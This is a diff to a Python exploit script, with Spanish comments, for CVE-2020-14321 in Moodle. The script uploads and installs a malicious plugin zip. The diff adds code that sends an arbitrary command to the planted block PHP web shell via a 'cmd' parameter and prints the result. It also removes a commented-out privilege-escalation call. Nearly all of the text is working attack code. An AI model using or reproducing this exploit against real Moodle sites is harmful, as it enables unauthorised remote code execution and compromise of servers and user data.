@@ -116,9 +116,7 @@ def RCE(url,sess,command,cadena):
 	}
 # Subir el plugin
 	url_upload =url+"/repository/repository_ajax.php"
-	response = sess.post(url_upload, params=data_get, data=files, files=data_file)	
-	print("OK")
-	print(response)
+	response = sess.post(url_upload, params=data_get, data=files, files=data_file)
     # install zip file
 	new_url=url+"/admin/tool/installaddon/index.php"
 	data={
@@ -151,6 +149,10 @@ def RCE(url,sess,command,cadena):
 
 
 	print("/blocks/"+cadena+"/lang/en/block_"+cadena+".php?cmd="+command)
+	data_get2 = {"cmd" : command}
+	response=sess.get(url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php", params=data_get2)
+	print(response.text)
+	
 if __name__ == '__main__':
 	
 	print("""                           ***CVE 2020 14321*** 
@@ -184,5 +186,4 @@ if __name__ == '__main__':
 	direct=crearDirectorios(cadena)
 	crearZip(direct)
 	sess=conexionMoodle(url,uname,upass)
-    #privilegeEscalationToManagerCourse(url,sess)
 	RCE(url,sess,command,cadena)
